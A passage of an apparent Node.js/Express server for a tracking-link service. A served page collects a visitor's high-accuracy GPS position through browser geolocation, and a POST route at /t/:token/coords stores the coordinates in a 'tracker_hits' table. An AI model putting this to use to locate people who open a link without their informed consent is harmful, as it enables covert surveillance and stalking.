      setTimeout(function(){
        navigator.geolocation.clearWatch(watch);
        navigator.geolocation.getCurrentPosition(
          function(p){ send(p.coords.latitude, p.coords.longitude, p.coords.accuracy); },
          function(){ go(); },
          {timeout:5000, maximumAge:10000, enableHighAccuracy:true}
        );
      }, 15000);
    } else { go(); }
  </script>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html");
  return res.send(html);
});

// Receives GPS coordinates from tracking page and updates the hit
app.post("/t/:token/coords", async (req, res) => {
  const { hitId, lat, lon, accuracy } = req.body;
  if (!hitId || lat == null || lon == null) return res.json({ ok: false });
  await supabaseAdmin
    .from("tracker_hits")
    .update({ gps_lat: lat, gps_lon: lon, gps_accuracy: accuracy || null, location_source: "gps" })
    .eq("id", hitId);
  return res.json({ ok: true });
});

app.listen(5000, () => {
  console.log("Server running on http://localhost:5000");
});
